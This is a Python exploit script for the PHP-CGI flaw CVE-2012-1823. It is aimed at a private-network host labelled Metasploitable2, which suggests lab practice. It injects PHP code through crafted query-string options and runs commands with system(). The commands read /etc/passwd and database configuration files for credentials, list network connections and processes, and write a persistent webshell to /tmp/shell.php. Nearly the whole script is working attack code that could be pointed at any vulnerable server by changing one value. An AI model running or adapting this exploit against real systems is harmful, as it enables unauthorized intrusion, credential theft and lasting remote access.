"""CVE-2012-1823 RCE 利用 - 交互式 webshell"""
import requests
import sys

TARGET = "http://192.168.18.131/index.php"

def rce(cmd):
    url = TARGET + "?-d+allow_url_include%3D1+-d+auto_prepend_file%3Dphp%3A%2F%2Finput+-n"
    r = requests.post(url, data=f"<?php system('{cmd}'); ?>", timeout=5)
    # Extract output between RCE marker and next HTML
    out = r.text
    # Find our output
    idx = out.find("system('")
    if idx >= 0:
        end = out.find("</pre>", idx)
        if end >= 0:
            return out[idx:end].strip()
    # Try different pattern
    lines = out.split('\n')
    result = []
    capture = False
    for line in lines:
        if cmd in line or capture:
            result.append(line)
            if len(result) > 5:
                break
    return '\n'.join(result[:3])

def rce_raw(cmd):
    url = TARGET + "?-d+allow_url_include%3D1+-d+auto_prepend_file%3Dphp%3A%2F%2Finput+-n"
    r = requests.post(url, data=f"<?php echo '===OUT==='; system('{cmd}'); echo '===END==='; ?>", timeout=5)
    text = r.text
    start = text.find("===OUT===") + 9
    end = text.find("===END===")
    if start > 9 and end > start:
        return text[start:end].strip()
    return text[:500]

print("CVE-2012-1823 RCE - Metasploitable2\n")

# 1. 系统信息
print("[+] System info")
print(rce_raw("uname -a"))
print(rce_raw("cat /etc/issue"))

# 2. 用户列表
print("\n[+] /etc/passwd (interesting users)")
print(rce_raw("cat /etc/passwd | grep -v nologin | grep -v false"))

# 3. MySQL/MariaDB credentials
print("\n[+] Database credentials")
print(rce_raw("cat /var/www/phpMyAdmin/config.inc.php 2>/dev/null || cat /etc/mysql/my.cnf 2>/dev/null || echo 'not found'"))
print(rce_raw("ls /var/www/html/"))

# 4. Network info
print("\n[+] Network info")
print(rce_raw("netstat -tunp 2>/dev/null || ss -tunp"))

# 5. Try to write webshell
print("\n[+] Attempting webshell write")
# Try /tmp first (usually writable)
test_write = rce_raw("echo test > /tmp/wvs_test && cat /tmp/wvs_test && rm /tmp/wvs_test")
if "test" in test_write:
    print("  /tmp writable!")
    # Write persistent webshell
    shell = "<?php if(isset($_GET['c'])){system($_GET['c']);} ?>"
    rce_raw(f"echo '{shell}' > /tmp/shell.php")
    print("  Shell written to /tmp/shell.php")
else:
    print(f"  /tmp not writable: {test_write[:100]}")

# 6. Check for other services
print("\n[+] Services")
print(rce_raw("ps aux | head -20"))
